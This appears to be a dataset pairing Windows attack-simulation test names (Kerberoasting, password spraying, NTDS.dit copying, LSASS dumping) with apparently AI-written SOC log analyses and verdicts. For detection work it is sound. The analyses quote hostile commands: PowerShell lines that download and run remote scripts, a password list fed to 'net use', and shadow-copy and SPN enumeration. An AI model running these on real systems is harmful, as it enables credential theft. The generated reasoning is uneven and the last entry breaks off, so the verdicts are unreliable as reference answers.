Password Brute User using Kerbrute Tool,"Based on the provided log entries from various Windows event logs, here is a detailed analysis pointing out any suspicious or anomalous behavior:

### Analysis:

1. **PowerShell Execution:**
   - The PowerShell logs indicate the execution of `powershell.exe` with command-line arguments involving a `script.exe` located in a `Temp` directory. The script appears to be used for a ""bruteuser"" operation, specifically mentioning ""bruteuser --dc $ENV:userdnsdomain -d $ENV:userdomain $env:temp\\bruteuser.txt TestUser1"". This suggests an account brute force attack or user enumeration tool, which is highly suspicious and generally not associated with regular administration or user activity, especially on a CEO's machine.

2. **Sysmon Logs:**
   - Sysmon logs show the execution of PowerShell, and other system processes such as `conhost.exe`, `wevtutil.exe`, and `hostname.exe`, which may be involved in legitimate activities, but their association with the suspicious PowerShell script could imply lateral movement or reconnaissance activities. Given the context of `powershell.exe` being used for a potentially malicious script, these Sysmon entries deserve closer scrutiny.

3. **Security Logs:**
   - Security logs include repeated 4798 events (enumeration of user accounts) and 4624 events with LogonType 5 (service logon), which may indicate automated script activities. The association between these logs and the suspicious PowerShell execution increases the likelihood of an ongoing or attempted compromise.

4. **Application and System Logs:**
   - The logs for Windows Defender show normal operations, and there are regular entries for `MicrosoftEdgeUpdate`. However, the actions taken during the use of the PowerShell command and its potential interaction with system services and processes have not been flagged by Windows Defender, indicating the need for further policy evaluation in security configurations.

### Assessment:

- **Suspicious Activity:**
  - The execution of a `bruteuser` function via PowerShell, targeting environments/user domains, in tandem with potential account enumeration activity, raises significant concerns about possible malicious intent. The activity could suggest potential lateral movement attempts or unauthorized access efforts on the network.
 
### Threat/Risks Identified:

- Possible brute force or user account enumeration using the script, which could lead to unauthorized access if successful.
- Potential for wider compromise if script execution establishes persistence or captures sensitive credentials.
   
### Recommended Actions:

- **Isolation and Investigation:**
  - Isolate the affected system to prevent potential spread within the network.
  - Conduct a detailed investigation into the source and intentions of the `script.exe` to determine if any sensitive information was compromised or if unauthorized access was achieved.

- **Review Security Configurations:**
  - Assess PowerShell execution policies and consider implementing more restrictive policies.
  - Ensure logging policies appropriately capture detailed command-line activities for such critical systems.

- **User and Network Level Mitigation:**
  - Advise users to change passwords if there's any indication of compromised credentials.
  - Monitor network traffic for additional anomalies that could relate to this script's execution.

### Resolution:
- **Resolution: MALICIOUS**

The logs indicate activity that is highly indicative of malicious behavior targeting user account credentials through brute force or enumeration techniques. Immediate action and further investigation are warranted."
WinPwn - PowerSharpPack - Kerberoasting Using Rubeus (2),"### Detailed Analysis of Windows Event Logs

Upon reviewing the provided logs, several indicators suggest potentially malicious activity occurring on the host, specifically concerning suspicious use of PowerShell.

#### Suspicious and Anomalous Behavior Identified

1. **EdgeUpdate Execution and Service Stop**
   - Several processes are regularly executed under `C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe`. While EdgeUpdate is a legitimate process for updating Microsoft Edge, the excessive execution, particularly starting from a temporary directory, might be worth further scrutiny.
   - The service stop related to `edgeupdate` at `23:13:50` in the Application log could be considered normal, but in context with the suspicious activity, it raises a flag.

2. **Suspicious PowerShell Execution**
   - The Sysmon and PowerShell event logs reference a PowerShell script execution originating from:
     ```
     ""powershell.exe"" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/script/script/master/scriptBinaries/Invoke-script.ps1'), Invoke-script -Command \""script /format:hashcat /nowrap\""}
     ```
   - This command involves downloading and executing a script via `Invoke-Expression` (iex), a common method for executing potentially harmful scripts.
   - The use of `net.webclient` suggests an attempt to pull external resources, which is suspicious, especially when executing scripts from untrusted or unexpected URLs. The script repository points towards GitHub.

#### Indications of Malicious Activity

- **PowerShell Logs:**
  - Show a detailed script being run and terminated (`600` and `403` event IDs).
  - Passing encoded URLs as command-line arguments often indicates obfuscation, a technique typically employed by attackers to evade detection.

- **Elevation of Privileges or Execution Context:**
  - Most processes are executed at high integrity level by `SERVER002\admin_test` which implies these were executed with elevated privileges, a common tactic used for privilege escalation.

- **Pattern of Behavior:**
  - The pattern, sequence, and associated PowerShell command point towards an unauthorized and potentially harmful script execution.

### Assessment of the Situation

Based on the combination of indicators present in these logs—specifically the suspicious PowerShell command activity, consistent abnormal Edge Update activity, and compromised processes executed under elevated privileges—the evidence suggests malicious behavior.

### Resolution

The logs should be flagged as **MALICIOUS**. This conclusion is due to the clear indicator of unauthorized PowerShell script execution that attempts to pull scripts from an external source and execute them, which is a classic indicator of compromise.

### Guidance on How to Proceed

1. **Immediate Containment and Eradication:**
   - Isolate the affected system to prevent further malicious activity or lateral movement within the network.
   - Conduct a detailed forensic investigation to analyze the impact and method of compromise.
   - Remove any unwanted or suspicious PowerShell scripts and associated malware.

2. **Response and Remediation:**
   - Update and patch the affected systems, especially focusing on the latest security updates for Microsoft products.
   - Conduct a thorough review of administrative privileges and permissions.
   - Utilize threat intelligence feeds to identify and block any known malicious URLs or IP addresses identified during this incident.

3. **Post-Incident Activity:**
   - Implement enhanced monitoring, particularly around PowerShell and administrative activities.
   - Educate users about recognizing suspicious activities and avoiding execution of untrusted scripts.

Taking these steps will help in addressing the immediate threat while also bolstering defenses to prevent similar future incidents."
Extract all accounts in use as SPN using setspn,"To conduct a thorough analysis of the provided Windows event logs, we reviewed the Sysmon, Security, Application, System, and PowerShell logs, as Sysmon was the primary focus in the logs provided. Below are the observations and potential indicators of suspicious or malicious activity.

### Observations and Indicators:

1. **Frequent Execution of System Utilities:**
   - There are multiple Sysmon EventID 5 logs indicating the execution of processes like `wevtutil.exe` and `conhost.exe` by a user named `SERVER002\\admin_test`. This pattern indicates potential exploration actions consistent with scripting or command-line execution by an administrative account.

2. **Privileged Account Usage:**
   - The account used is `admin_test`, which appears to have access to administrative tasks, as shown by high integrity level processes and executions like `powershell.exe`. This could potentially indicate a legitimate administrative task; however, the concentration of utility use like `setspn.exe` and `whoami.exe` could signal unauthorized reconnaissance activities.

3. **Sysmon EventID 1 (Process Creation):**
   - Notably, activities involving the command-line usage of system utilities such as `cmd.exe` with `/c setspn -T %%USERDNSDOMAIN%% -Q */*` suggest domain reconnaissance or manipulation actions that need verification because `setspn` is not commonly seen in typical user operations unless specific configuration tasks are happening.

4. **Time Synchronization Events:**
   - There are time change logs in the System and Security logs (EventID 4616 and Kernel-General ID 1) that seem related to system time adjustments. This is regularly safe with valid reasons, but unexplained or frequent changes could mask illicit activities within logs.

5. **Microsoft Edge Update Activities:**
   - The Sysmon logs include various executions relating to `MicrosoftEdgeUpdate.exe`. These appear as typical update processes, although checking their version and hashes to rule out potential misuse for masquerading as legitimate applications would be prudent.

### Assessment:

Given the activities, some indicators warrant further scrutiny, especially the evident execution of several administrative or system utilities under an administrative context with a high frequency. Activities around `setspn.exe`, `wevtutil.exe`, and the consistency of high privileges might indicate more definitive actions looking to enumerate or alter environment settings.

### Recommendation:

1. **Investigation:**
   - Review access logs and verify that all observed activities involving `admin_test` are legitimate and authorized, collaborating with system administrators for validation.
   - Examine associated process command-line arguments and verify if these operations align with planned system administration tasks or schedules.

2. **Alerting:**
   - Configure alerting on suspicious command-line arguments especially related to tools like `setspn`, `wevtutil`, and `net.exe`.

3. **Network and Domain Monitoring:**
   - Conduct network monitoring to capture any unexpected outgoing communication or queries potentially tied to these processes when they execute.

4. **Version and Hash Verification:**
   - Verify the hashes and version details of applications like `MicrosoftEdgeUpdate.exe` to ensure they align with legitimate known updates.

Based on this analysis, the activities within these logs fall under the classification:

**Resolution: SUSPICIOUS** 

This classification suggests that there are signs of activity requiring further investigation to determine if it is benign or indicative of compromise."
WinPwn - Loot local Credentials - Decrypt Teamviewer Passwords,"After thoroughly analyzing the provided Windows event logs, I have identified several key elements worth discussing.

### Observations:

1. **Execution of PowerShell Script**
   - There's a record of PowerShell being executed with a command line referencing a script retrieved from a GitHub repository:
     ```
     ""CommandLine"":""\""powershell.exe\"" & {$script_repo='https://raw.githubusercontent.com/script', iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/script/script/121dcee26a7aca368821563cbe92b2b5638c5773/script.ps1'), decryptteamviewer -consoleoutput -noninteractive}""
     ```
   - This indicates that a script from an external source was downloaded and executed, potentially allowing for arbitrary command execution or data modification on the system.

2. **User Privileges and Execution Context**
   - The suspicious activity was executed under a high-integrity level by the user `admin_test`, which has a number of elevated privileges (`SeDebugPrivilege`, `SeBackupPrivilege`, etc.). This suggests potential misuse of admin credentials or account compromise.
   - Logs also show that the user `admin_test` logged in using NTLM authentication from `DESKTOP-3HL5B2P`.

3. **Time Discrepancies**
   - System logs indicate a time discrepancy event with a rollback and reversion within a very short period (EventID `4616` and `1`). Time manipulation can potentially be an attempt to cover tracks or confuse log timelines.

4. **Use of `wevtutil.exe` and `conhost.exe`**
   - Frequent invocation of `wevtutil.exe` by the same user could indicate attempts to manage or alter event logs, possibly to delete or cover up traces of unauthorized activities.
   - `conhost.exe` adjacency is typical, yet if the pattern is unconventional based on usage at the organization, it could indicate monitoring or forward actions.

5. **Presence of Shell Commands like `whoami.exe` and `hostname.exe`**
   - Execution of basic commands such as `whoami.exe` and `hostname.exe` by `admin_test` are suspicious in context as they commonly precede other administrative tasks both dubious or legitimate. Given other findings, these reinforce signs of possible reconnaissance.

### Assessment:

Based on the analysis, the use of an externally sourced PowerShell script executed with elevated privileges raises significant suspicion, especially considering the administrative capabilities of the user account involved. The pattern of processes and the timing suggest that these actions could be part of a larger sequence aimed at manipulation or unauthorized access to systems or data.

### Conclusion:

- **Resolution**: **MALICIOUS**

Given the nature of actions observed, there is strong evidence to suggest malicious activities, primarily due to the execution of an external script with elevated privileges and authoritative processes like `wevtutil.exe`, potentially indicating log tampering.

### Guidance:

1. **Immediate Mitigation**
   - Terminate suspicious sessions and application processes associated with `admin_test`.
   - Lockdown and change credentials for the affected accounts.
   
2. **Further Investigation**
   - Capture and analyze the full content of the executed PowerShell script and determine its impact.
   - Review network traffic logs for data exfiltration.
   - Check for any other systems accessed from the same workstation `DESKTOP-3HL5B2P`.

3. **Preventive Measures**
   - Enhance logging, monitoring, and alerting capabilities, especially for administrative accounts and script executions.
   - Implement stricter access controls and review privilege assignments regularly.
   - Educate employees about phishing and potential credential compromise scenarios.

The collected evidence requires immediate containment and investigation to prevent further unauthorized actions or potential data breaches."
WinPwn - Snaffler,"In reviewing the provided log entries, I have identified a series of events that suggest potential malicious activity:

1. **PowerShell Usage**: There is a PowerShell command that downloads and executes a script from a remote source (GitHub). This is indicated by the following command being executed: 
   ```
   ""powershell.exe\"" & {$script_repo='https://raw.githubusercontent.com/script', iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/script/script/121dcee26a7aca368821563cbe92b2b5638c5773/script.ps1'), script -noninteractive -consoleoutput}
   ```
   The use of `Invoke-Expression` (`iex`) combined with `Net.WebClient` to download and execute a script is a common technique used in attacks to execute malicious code.

2. **High Privileges**: The executed PowerShell command ran with a high integrity level, suggesting it was executed with elevated privileges. This can increase the risk of compromise as malware executed with such privileges could make critical system changes.

3. **Time Manipulation**: The system time is being adjusted, which can sometimes be used to cover malicious activities by preventing proper timestamp logging.

4. **System and Network Activity**: Several instances of processes like `HOSTNAME.EXE`, `conhost.exe`, `wevtutil.exe`, and `whoami.exe` are being executed. These commands are often used by attackers in the reconnaissance phase to gather system details.

5. **Edge Update Anomalies**: Although Microsoft Edge Update services are expected on Windows systems, the extent and high frequency of events related to Microsoft Edge Update, including its associated `msedgeupdate.dll` being executed from temporary directories, is uncommon and may suggest tampering or misuse of the service.

**Assessment**:
Based on the evidence found:
- The use of PowerShell to download and execute scripts from unverified sources.
- High-privilege integrity context of these commands.
- System time manipulation.
  
This activity is highly indicative of **MALICIOUS** activity.

**Recommended Actions**:
1. **Contain the Incident**: Isolate the affected host from the network to prevent further spread or exfiltration of data.
2. **Detailed Forensic Analysis**: Conduct a thorough investigation into the downloaded script’s content and its intended actions. Look for other potential indicators of compromise.
3. **Audit and Monitor**: Review user account activities, especially the `admin_test` account, for abnormal behaviors. Implement heightened monitoring for similar PowerShell command executions across the network.
4. **Update Security Measures**: Ensure the latest security patches and defenders are active and running to help prevent similar future attacks.
5. **Educate and Train Staff**: Reinforce security awareness, focusing on safe practices regarding email attachments, link-clicking, and execution of unknown scripts.

Careful analysis and immediate action are crucial to mitigate the identified risks and protect organizational assets."
Retrieve Microsoft IIS Service Account Credentials Using AppCmd (using config),"### Detailed Analysis of the Logs

#### 1. **PowerShell Log Analysis:**
- **PowerShell Execution:** The logs show a series of events indicating the PowerShell host was started using the following command: `powershell.exe & {C:\\Windows\\System32\\inetsrv\\appcmd.exe list apppool /config}`.
- This command is related to application pool configuration management in Internet Information Services (IIS). Such operations can be standard for system administration tasks but the execution by a user other than an administrator could be concerning.
- **User Information:** The logs do not explicitly detail the user context other than `SERVER002\\admin_test`, indicating administrative privileges, which is appropriate for such actions.

#### 2. **Sysmon Log Analysis:**
- **Process Execution:** Two key processes stand out: 
  - **Edge Installation Process:** Multiple executions related to Microsoft Edge installations, such as `""C:\\Program Files (x86)\\Microsoft\\EdgeUpdate\\Install\\{CB48DEF3-2F02-4D37-86AE-B52BE02FED13}\\MicrosoftEdge_X64_130.0.2849.46_129.0.2792.89.exe""` with various IDs and descriptions, appear in the Sysmon logs. These indicate an Edge browser update.
  - **PowerShell and CMD Execution:** An unusual series of command executions using `conhost.exe`, `wevtutil.exe`, `whoami.exe`, and `hostname.exe`. Though `whoami.exe` and `hostname.exe` are often used to gather system information, which might be considered normal, the presence of `wevtutil.exe` (used to read event logs) suggests potential forensic investigation or log manipulation attempts.

#### 3. **General Observations:**
- **User Context:** Most of these activities are executed under `SERVER002\\admin_test` with high integrity levels. This reflects actions carried out with elevated privileges, which can be a security concern if these activities were unintended by the legitimate system administrator.
- **Diversity of Actions:** The use of a variety of system administration tools (`appcmd`, `wevtutil`, `hostname`, `whoami`) in a script-like or chained manner may indicate an attempt to gather system information or manipulate system configurations/logs, especially if carried out rapidly within a short timeframe.
- **No Clear Malicious Indicators:** The logs do not explicitly show classic signs of malware, such as download and execution of a malicious payload, but the usage pattern is atypical.

### Assessment and Recommendations

- **Resolution:** **SUSPICIOUS**
- **Reason:** The combination of administrative actions, quick successive execution of system utilities, and the context under which these processes occur is suspicious, indicating that it warrants further investigation.
- **Actionable Steps:**
  1. **Verify Legitimacy:** Confirm with the system administrators if these actions were intentional. Check if the user account `admin_test` is known and if the actions align with scheduled updates or maintenance tasks.
  2. **Account and Identity Verification:** Investigate any anomalous use of the `admin_test` account. Look for unauthorized access patterns or attempts.
  3. **Log Integrity Review:** Assess the integrity of event logs to ensure no tampering has occurred, given the use of `wevtutil.exe`.
  4. **System and Network Monitoring:** Increase the monitoring of the affected and surrounding systems for further irregular activities.
  5. **Endpoint Security Audit:** Consider reviewing and enhancing endpoint security protocols and configurations to detect such activities more effectively in the future.

By following these steps, you can better understand the context of these observed behaviors and mitigate potential risks."
Simulating access to Chrome Login Data,"### Detailed Analysis of the Logs

Upon analyzing the provided logs, particularly focusing on Windows PowerShell, Sysmon, Security, and Application logs, several observations can be made:

#### Windows PowerShell Logs

1. **Suspicious PowerShell Activity:** There are PowerShell commands logged which involve copying Chrome user data files (`Login Data` and `Login Data For Account`) to a temporary directory (`C:\Users\ADMIN_~1\AppData\Local\Temp\file\..\\Externalfiles`). This action could be indicative of credential harvesting or data exfiltration attempts.

#### Sysmon Logs

1. **PowerShell Execution:** Multiple Sysmon logs indicate the execution of PowerShell with command-line arguments that match the suspicious activity seen in the PowerShell logs. This further confirms that the files were indeed accessed and potentially moved, corroborating possible unauthorized data access.
   
2. **User Context:** The user executing these commands is `SERVER002\admin_test`, and the processes are being executed with high integrity levels, suggesting that the user has administrative privileges.

3. **Normal System Processes:** Various system processes like `svchost.exe`, `taskhostw.exe`, `DeviceCensus.exe`, and others were executed under `NT AUTHORITY\SYSTEM`. These seem normal for system maintenance and do not appear tied to the suspicious PowerShell activity.

#### Security Logs

1. **Privileged Access:** The `admin_test` account appears to have accessed certain privileged functionalities as indicated by the privileges (`SeDebugPrivilege`, etc.) seen in the logs. This elevated access aligns with the administrative capabilities needed for the suspicious PowerShell activity.

2. **Logon Events:** There are several logon type 5 events, which are system account logons, indicating system processes running under the `SYSTEM` account. These do not directly relate to the suspicious activity but indicate a typical pattern in a server environment.

#### Application Logs

1. **SPP Logs:** The `Software Protection Platform Service` logs an event, but there is no significant information related to suspicious or malicious activities in this context.

### Assessment of the Situation

The PowerShell logs particularly stand out due to the potential for data exfiltration, as they involve copying sensitive browser data files without a clear legitimate purpose. The presence of these commands, along with their execution confirmed in the Sysmon logs, strongly suggests an intention to harvest browser credentials.

### Threats or Risks Identified

- **Credential Harvesting Risk:** The PowerShell activity of copying Google Chrome login data is highly indicative of possible credential theft.
- **Potential Insider Threat:** The actions are executed by an account (`admin_test`) with administrative capabilities, which could indicate misuse by an insider or compromise of an admin account.

### Guidance on How to Proceed

1. **Immediate Security Action:** Quarantine the machine and disable the `admin_test` account until a thorough review is conducted.
2. **Data Review:** Investigate logs further to determine if data was exfiltrated from the host.
3. **Account Audit:** Conduct a security audit of all administrative accounts for compromise signs.
4. **Incident Response:** Initiate incident response procedures to contain, eradicate, and recover from this event and similar threats.

### Resolution

Based on the evidence of unauthorized and suspicious access to sensitive data, the activity in the logs exhibits clear signs of potential compromise.

**Resolution: MALICIOUS**"
Create Volume Shadow Copy with vssadmin,"After analyzing the provided Windows event logs, here is a detailed assessment of the situation:

### Analysis of Logs

#### Security Log

- **Event ID 5379**: This event is logged when Windows Query Service for user credentials fails. The logs show repeated attempts with `ReturnCode=""3221226021""`, indicating a failure for credential retrieval for `MicrosoftAccount:user=02txoixylodcstop`. The errors and the repeated nature suggest unauthorized attempts to access credentials, which could be suspicious, especially given the context of the CEO's machine.

#### Application Log

- **Windows Defender Status**: The log indicates that Windows Defender is active (`SECURITY_PRODUCT_STATE_ON`). This is generally good for system protection, assuming it remains uncompromised.

#### System Log

- **Windows Update Activity**: Event IDs 44, 43, and 19 indicate processes related to updating of Microsoft Defender Antivirus. This seems benign and part of normal system update activity, ensuring the antivirus has the latest definitions.

#### Sysmon Log

- **Process Activity**: 
  - Multiple `cmd.exe` and associated processes (`conhost.exe`, `reg.exe`, `findstr.exe`) indicate registry queries and string searches.
  - Use of commands to check `ProductType` in the registry is often behavior exhibited during reconnaissance by attackers to determine the environment.
  - **Creation of Shadow Copies**: The execution of `vssadmin.exe create shadow /for=C:` is noteworthy. This command, often abused by ransomware, suggests the intent for data protection circumvention.

- **Elevation and Info Gathering Utilities**: Uses of `whoami.exe` and `hostname.exe` to gather system information can also suggest adversary reconnaissance behaviors are taking place.

#### PowerShell Log

- Unfortunately, no entries were logged, missing insights into potential script execution.

### Assessment and Findings

The combination of registry queries, attempted credential access, shadow copy creation, and system reconnaissance indicates an amalgam of behaviors consistent with nefarious activities such as ransomware or a precursor to further exploitation and lateral movement within an organization. The logs from the CEO's device being inspected heightens the concern due to the high-value target.

### Threats and Risks Identified

- These activities may demonstrate preparation for data exfiltration, encryption, or broader security compromise.
- The use of native admin tools (like `vssadmin`) and PowerShell (if absent logs suggest evasion) points towards sophisticated efforts to minimize detection.

### Guidance

To proceed with this situation, consider the following actions:
1. **Isolate the machine** from the network to prevent potential spread if malicious activity is verified.
2. **Perform further investigation** into specific processes and their origins to trace any malware presence or exploit vectors.
3. **Conduct a comprehensive security audit** and scanning on the CEO’s machine and connected networks to identify remaining footprints or indicators.
4. **Review and reinforce access controls** to ensure that unauthorized access remains limited and can trigger alerts.

### Resolution
Considering the suspicious behaviors observed, the resolution for this assessment is:

- **SUSPICIOUS** - Indications in the logs suggest activities that are not typical for standard operations and warrant further investigation to confirm whether they are indeed malicious."
Copy NTDS.dit from Volume Shadow Copy,"**Analysis of Windows Event Logs:**

1. **Security Log Analysis:**
   - **Event ID 4624**: Indicates a successful logon. The logon was of type 5 (Service). The user ""SYSTEM"" on ""NT AUTHORITY"" is standard behavior for system services in Windows.
   - **Event ID 4672**: Special privileges were assigned to a new logon. These included several powerful privileges such as `SeDebugPrivilege`. While this could be normal for SYSTEM logons, the presence of numerous high privileges requires careful examination, particularly if it isn't typical for regular operations.
   - **Event ID 4616**: Time changes were observed, which is unusual and may indicate attempts to manipulate time for deceptive purposes.
   - **Event ID 5379**: Credential validations have failed multiple times with a return code ""3221226021,"" suggesting password or account information failure. It may indicate failed brute force or unauthorized access attempts against a Microsoft Account.

2. **Sysmon Log Analysis:**
   - **Event ID 1**: Creation of several cmd.exe processes with potentially harmful command lines for copying and saving sensitive files, such as `NTDS.dit` and `SYSTEM` hives, is highly suspicious. This behavior aligns with ""Volume Shadow Copy"" and registry hive dumping tactics often employed by attackers for credential harvesting and privilege escalation.
   - **Event ID 5**: Observed `wevtutil.exe` operations. Using `wevtutil.exe` to export logs is not commonly automated and can indicate tampering with logs, potentially to cover tracks after malicious activity.
  
3. **System Log Analysis:**
   - Time skew detected which corroborates with the findings in the Security logs indicating possible attempts for timeline tampering.

**Assessment:**
The log entries exhibit several indicators of potential malicious activities:
- The command lines executed through cmd.exe exploiting volume shadow copies and exporting sensitive data are indicative of credential harvesting attempts.
- The execution of several administrative tasks using SYSTEM privileges raises concerns about unauthorized escalation.
- Failed attempts for Microsoft Account credential access support the theory of suspicious activities targeting password or user manipulation.

**Resolution:** **MALICIOUS**

**Recommendations for Action:**
1. **Immediate containment**: Disconnect the affected system from critical networks to prevent further data exfiltration or lateral movement.
2. **Thorough investigation**: Engage in deeper forensic analysis, especially focusing on file timestamps, volume shadow copy usage, and registry changes.

5. **Patching and Hardening**: Immediately patch any vulnerabilities, ensure proper security configurations, and employ least privilege principles. 
6. **Incident Reporting and Recovery**: Follow incident reporting protocols and prepare system recovery operations without relying on current backups due to potential contamination."
Dump LSASS.exe Memory using direct system calls and API unhooking,"Upon reviewing the provided Windows event logs, several points of interest arise that may indicate suspicious or potentially malicious activity:

### Analysis:

1. **4624 Security Log - Successful Logon:**
   - The log entry reflects a type 5 logon, which is a service logon. This is typical for processes running under the ""NT AUTHORITY\SYSTEM"" context, such as services.exe. By itself, this event does not indicate malicious activity.

2. **4672 Security Log - Special Privileges Assigned:**
   - This log shows that the ""SYSTEM"" account was assigned a wide set of powerful privileges, including SeDebugPrivilege, which can allow debugging of processes, and SeTakeOwnershipPrivilege, allowing an account to take ownership of resources. While this is usual for SYSTEM level logons, it becomes suspicious in combination with other anomalies.

3. **Sysmon Logs - Powershell, wevtutil, and File Execution:**
   - Several processes were initiated by the SERVER002\admin_test user, including PowerShell and wevtutil. Notably, wevtutil was used to export log data, which could signal attempts to cover tracks.
   - The presence of the command `""cmd.exe"" /c ""C:\Users\ADMIN_~1\AppData\Local\Temp\file\..\Externalfiles\Outflank-scriptt.exe""` indicates execution of a script located in a less common directory, which could be indicative of a malware dropper or payload. The naming suggest possible usage of tools such as scripts for penetration testing or malicious purposes.

4. **Process Chain and Command Execution:**
   - The process chain involves commonly used administrative tools (e.g., Powershell, wevtutil) and utilities (e.g., HOSTNAME.EXE, whoami.exe) executed in rapid succession and potentially for reconnaissance.
   - The command line for `wevtutil` exporting logs is unusual under normal operation scenarios unless specifically managed or requested for review by an authorized administrative action.

### Assessment:
- The combination of executed commands, particularly the invocation of `wevtutil` with a log export, the manual execution of potentially malicious script names in irregular locations, and the overall timing and rapidity of these actions all hint towards potential malicious activity. The use of PowerShell and cmd.exe in this manner is often seen in compromise scenarios.

### Conclusion:
- **Resolution: MALICIOUS**
  - The collected logs suggest unauthorized or malicious exploitation activities possibly linked to an attacker leveraging administrative tools for lateral movement or covering tracks.
  
### Recommendations:
- **Immediate Actions:**
  - Disconnect the affected machine from the network to prevent further lateral movement.
  - Preserve all related logs and data for further forensic investigation.
  - Conduct a thorough check on the existence and activity related to `Outflank-scriptt.exe`.
  - Reset passwords and review access on accounts displaying suspicious activity, particularly the ""admin_test"" user.
  
- **Long-term Actions:**
  - Conduct a full scan and audit of systems for similar activities across the network.
  - Implement tighter access controls and monitoring on system utilities like PowerShell and cmd.
  - Consider security training or awareness programs regarding signs of malicious activity and proper reporting protocols.

These steps will help mitigate immediate threats and strengthen defenses against future incidents."
Gsecdump,"Upon examining the provided Sysmon, Security, and other log entries, we observe several key points that could indicate unusual or malicious activity. Here's a detailed analysis:

1. **Process Execution Patterns**:
   - A noteworthy pattern is observed with frequent launch of system utilities (e.g., `powershell.exe`, `wevtutil.exe`, `conhost.exe`, `cmd.exe`) under the user `SERVER002\admin_test`.
   - PowerShell, when executed with elevated privileges or specific scripts, can be a sign of script-based attacks.
   - The command `cmd.exe` is seen executing a suspicious path `C:\Users\ADMIN_~1\AppData\Local\Temp\file\..\\Externalfiles\\script.exe` which is abnormal. Execution from temp directories by scripts is often associated with malware and evasion techniques.
   - This cmd execution is followed by a conhost session, suggesting that the script may have involved interactive console tasks.

2. **Unusual Command Line Usage**:
   - The command line for `cmd.exe` involves escape sequences and backward navigation (..\\), indicating attempts to obfuscate the path or access unauthorized files/directories.

3. **High Integrity Level**:
   - Multiple processes are running at a High integrity level, especially `cmd.exe`, which signifies administrative privileges. If these processes weren't initiated by legitimate administrative tasks, this could be an indication of privilege escalation or abuse.

4. **Activity Patterns**:
   - Frequent calls to `wevtutil.exe` are logged. This tool is used to manage event logs; its repeated execution might indicate logs being cleared or tampered with to cover tracks of illicit activities.
   - Use of the `hostname.exe` and `whoami.exe` can point to enumeration activities—often precursors to further exploitation.

5. **Associated Security Events**:
   - The security logs indicate failed credential operations (`ReturnCode=3221226021`) related to both `MicrosoftAccount` and `WindowsLive` accounts. Multiple failed credential reads could signify attempted access or compromise trials.

### Assessment:
The logs demonstrate patterns consistent with potentially malicious activity:

- **Unusual administrative commands and script execution** without clear administrative tasks suggest a possibility of manual intervention by an adversary.
- **Execution from temporary directories** and obscure paths often accompany malware behaviors.
- **Credential access failures** and enumeration activities highlight potential reconnaissance and preparation steps for further attacks.

### Resolution:
- **Resolution: MALICIOUS**

### Recommendations:
- **Immediate Incident Response Actions**: Quarantine the affected host to prevent further spread of a potential compromise.
- **Thorough Forensic Analysis**: Analyze other endpoints and logs for similar patterns or lateral movements.
- **Security Controls Enhancement**: Strengthen access controls and possibly enhance PowerShell logging to capture detailed command-line usage.
- **User Awareness and Training**: Educate administrative users about secure practices and the risks of executing unverified scripts."
Brute Force Credentials of single Active Directory domain users via SMB,"### Analysis of Windows Event Logs

#### Initial Overview

Upon examining the logs, we can categorize potential areas of concern into process execution, command-line arguments, privilege escalation, and account activity.

#### Detailed Analysis

1. **Process Execution and Command-Line Arguments (Sysmon Logs):**
   - **Anomalous Process Execution:**
     - The Sysmon logs show multiple instances of command prompt (`cmd.exe`) being launched with unusual command lines that involve creating a `passwords.txt` file with presumable password entries and subsequently using these entries in network commands (`net use`). 
     - Example of command execution:
       ```
       cmd.exe /c echo Password1> passwords.txt & echo 1q2w3e4r>> passwords.txt & echo Password!>> passwords.txt & ...
       ```
     - The presence of plaintext passwords and attempts to use these for network access is a significant indicator of suspicious or potentially malicious activity.
   - **Network Commands:**
     - The `net.exe` usage suggests attempts to authenticate against network shares using various hardcoded passwords from the generated text file. This hints towards password spraying or brute force attempts.

2. **Privilege Escalation (Security Logs):**
   - There are multiple logs (Event ID 4672) indicating that the account `admin_test` was assigned several high-level privileges including `SeDebugPrivilege`. This kind of privilege allocation is generally not typical for regular operations and could be indicative of privilege escalation.

3. **Account Activities (Security Logs):**
   - The logon events (Event ID 4624) and logoff events (Event ID 4634) for the user `admin_test` show activity aligning with the execution of processes as analyzed above. 
   - Originating from an external IP (`192.168.0.102`), especially if this is unauthorized, adds to the suspicion.

4. **Routine Update Activities (Sysmon Logs):**
   - There are also numerous events related to Microsoft Edge Update processes. Though these seem legitimate, it would be crucial to ensure that the update binaries match expected versions and hashes to rule out any compromise in legitimate processes.

#### Summary of Findings

The activity depicted in the logs, such as the creation and use of a `passwords.txt` file for network access testing, coupled with the presence of powerful privileges granted to a user, strongly suggests that malicious activities are taking place:

- **Process Execution**: The execution of scripts or commands intended to test or exploit network password verifications indicates potentially malicious intent.
- **Privileged Operations**: The privilege escalation to include system privileges such as `SeDebugPrivilege` could allow an attacker to manipulate or inspect processes, including sensitive actions and data.

#### Risks

- Unauthorized network access using discovered or guessed passwords.
- Potential for lateral movement within the network using compromised credentials.
- Elevated privileges allowing manipulation of critical system resources.

### Conclusion and Resolution

Based on the provided logs, the investigation reveals that malicious activities are indeed present, particularly related to credential exploitation and privilege escalation. 

**Resolution: MALICIOUS**

**Guidance on How to Proceed:**

1. **Immediate Response**:
   - Initiate an incident response protocol to isolate the affected system.
   - Revoke suspicious account privileges, especially for `admin_test`.
   - Conduct a comprehensive inspection of network traffic for potential data exfiltration.
  
2. **Long-term Actions**:
   - Perform a thorough review and update of user account permissions.
   - Conduct organization-wide checks for similar behavior on other systems.
   - Enhance security measures, including stricter access controls and monitoring tools.

3. **Forensic Analysis**:
   - Capture a forensic image of the affected server for detailed examination.
   - Identify the initial vector of compromise to enhance security controls against future incidents.

The aforementioned actions are critical to both contain the current threat and to harden the infrastructure against similar future threats."
WinPwn - DomainPasswordSpray Attacks,"### Analysis of Windows Event Logs

Upon reviewing the provided logs for the CEO's machine (Server002), several events indicate potential unauthorized and possibly malicious activities. Below are the key findings broken down across the different logs:

#### Key Findings:

1. **Security Logs:**
   - **Time Change Events (Event ID: 4616):** 
     - Events indicate the Windows time has been changed by the `svchost.exe` process. Time changes can be a regular system process but are also indicative of anti-forensic behavior by attackers to manipulate log timestamps.

2. **Sysmon Logs:**
   - **Launching of Suspicious Processes:**
     - **`wevtutil.exe` and `conhost.exe` executions:** These processes are frequently executed which seems to be benign standalone but their frequency is noteworthy. Wevtutil is an administrative tool used to interact with event logs, which can be used by attackers to delete logs.
     - **Suspicious PowerShell Execution (Event ID: 1):** 
